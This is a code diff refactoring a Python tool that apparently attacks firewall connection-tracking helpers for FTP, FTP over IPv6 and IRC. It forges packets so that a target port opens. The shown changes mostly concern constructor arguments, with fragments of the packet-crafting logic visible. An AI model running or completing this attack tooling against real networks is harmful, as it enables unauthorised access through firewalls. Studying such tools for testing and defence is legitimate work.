@@ -27,12 +27,12 @@ import ftplib
 from time import sleep
 
 class attack_target:
-    def __init__(self):
-        self.ip = "192.168.2.2"
-        self.port = "5432"
-        self.iface = "eth0"
-        self.l3proto = "IPv4"
-        self.verbose = False
+    def __init__(self, iface, ip, port, verbose = False):
+        self.iface = iface
+        self.ip = ip
+        self.port = port
+        self.l3proto = 'IPv4'
+        self.verbose = verbose
 
     def build_filter(self):
         return ""
@@ -55,7 +55,7 @@ class attack_target:
             orig_src = pkt[Ether].src
             orig_dst = pkt[Ether].dst
             # change payload
-            if self.l3proto == "IPv4":
+            if self.l3proto == 'IPv4':
                 att = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IP()/TCP()
                 att[IP] = pkt[IP]
                 att[IP].id = pkt[IP].id + 1
@@ -128,8 +128,8 @@ class ftp_helper(attack_target):
         self.cv.release()
 
 class ftp6_helper(ftp_helper):
-    def __init__(self):
-        ftp_helper.__init__(self)
+    def __init__(self, iface, ip, port, verbose = False):
+        ftp_helper.__init__(self, iface, ip, port, verbose)
         self.l3proto = "IPv6"
 
     def build_command(self):
@@ -152,7 +152,7 @@ parser.add_argument('-t', '--target', default='192.168.2.2', help='IP address of
 parser.add_argument('-i', '--iface', default='eth0', help='Interface to use for sniffing communication')
 parser.add_argument('-p', '--port', default=5432, help='Target port that should be open on server after attack')
 parser.add_argument('-v', '--verbose', default=False, action="store_true", help="Show verbose output")
-parser.add_argument('--helper', default='ftp', help='Protocol and helper to attack (default to ftp)')
+parser.add_argument('--helper', default='ftp', help='Protocol and helper to attack (ftp [default], ftp6, irc)')
 args = parser.parse_args()
 
 # if not root...kick out
@@ -161,16 +161,12 @@ if not os.geteuid()==0:
     sys.exit(1)
 
 if args.helper == 'ftp':
-    target = ftp_helper()
+    target = ftp_helper(args.iface, args.target, int(args.port), verbose=args.verbose)
 elif args.helper == 'irc':
-    target = irc_helper()
+    target = irc_helper(args.iface, args.target, int(args.port), verbose=args.verbose)
 elif args.helper == 'ftp6':
-    target = ftp6_helper()
+    target = ftp6_helper(args.iface, args.target, int(args.port), verbose=args.verbose)
 else:
     sys.exit("Selected protocol is currently unsupported")
 
-target.ip = args.target
-target.iface = args.iface
-target.port = int(args.port)
-target.verbose = args.verbose
 target.run()
